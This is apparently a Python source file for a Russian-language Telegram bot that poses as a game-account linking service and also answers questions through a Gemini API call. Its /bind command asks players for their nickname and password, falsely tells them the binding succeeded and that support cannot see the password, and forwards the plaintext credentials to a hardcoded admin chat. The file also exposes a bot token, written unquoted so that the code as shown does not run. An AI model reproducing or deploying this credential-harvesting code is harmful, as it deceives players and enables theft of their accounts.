import os
import asyncio
import time
import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command

# Получаем переменные из настроек Render
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8070071877
GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")

bot = Bot(token=8814675882:AAFAhtmVUN5SnOh1r-ql-IO-fh7C1j4tR5s)
dp = Dispatcher()

user_cooldowns = {}

# Веб-сервер для Render (обязательно для запуска)
async def handle_ping(request):
    return web.Response(text="Bot is active!")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    welcome_text = (
        "[Бот] Для того, чтобы привязать игровой аккаунт, выполните следующие действия:\n"
        "1. Напишите (сюда): /bind [Ваш-Ник] [Ваш-Пароль]\n"
        "(Поддержка Ваш пароль не увидит)\n"
        "2. Напишите /help (сюда), чтобы увидеть возможности.\n"
        "Приятной игры на наших серверах!"
    )
    await message.answer(welcome_text)

@dp.message(Command("help"))
async def help_handler(message: types.Message):
    help_text = (
        "Список доступных команд:\n\n"
        "/bind [Ник] [Пароль] - Привязать игровой аккаунт к Telegram.\n"
        "/ai [ваш вопрос] - Задать вопрос нейросети Phoenix AI.\n"
        "/help - Показать это меню."
    )
    await message.answer(help_text)

@dp.message(Command("bind"))
async def bind_handler(message: types.Message):
    user_id = message.from_user.id
    current_time = time.time()
    
    if user_id in user_cooldowns:
        elapsed = current_time - user_cooldowns[user_id]
        if elapsed < 15:
            remaining = int(15 - elapsed)
            for sec in range(remaining, 0, -1):
                try:
                    timer_msg = await message.answer(f"До следующей попытки {sec} секунд")
                    await asyncio.sleep(1)
                    await timer_msg.delete()
                except Exception:
                    pass
            return

    args = message.text.split()
    if len(args) < 3:
        await message.answer("[Бот] Неверный формат! Используйте: /bind [Ник] [Пароль]")
        return
        
    username = args[1]
    password = " ".join(args[2:])
    
    user_cooldowns[user_id] = current_time

    await message.answer("[Бот] Аккаунт был успешно привязан!")
    
    tg_user = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    admin_msg = (
        f"Новый привязанный аккаунт!\n\n"
        f"Игрок: {tg_user}\n"
        f"Telegram ID: {user_id}\n"
        f"Ник: {username}\n"
        f"Пароль: {password}"
    )
    try:
        await bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
    except Exception as e:
        print(f"Ошибка отправки админу: {e}")

@dp.message(Command("ai"))
async def ai_handler(message: types.Message):
    question = message.text[3:].strip()
    
    if not question:
        await message.answer("Phoenix AI: Напишите вопрос после команды. Пример: /ai Как играть?")
        return

    thinking_msg = await message.answer("Phoenix AI думает...")

    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
    payload = {
        "contents": [{"parts": [{"text": question}]}]
    }

    try:
        timeout = aiohttp.ClientTimeout(total=25)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.post(url, json=payload) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    ai_answer = data["candidates"][0]["content"]["parts"][0]["text"]
                    reply = f"Phoenix AI:\n\n{ai_answer}"
                else:
                    reply = f"Phoenix AI: Ошибка API (код {resp.status}). Проверьте ключ."
        
        try:
            await thinking_msg.delete()
        except Exception:
            pass

        await message.answer(reply)
    except Exception as e:
        try:
            await thinking_msg.delete()
        except Exception:
            pass
        await message.answer(f"Phoenix AI: Ошибка при обработке: {str(e)[:50]}")

async def main():
    await start_web_server()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())

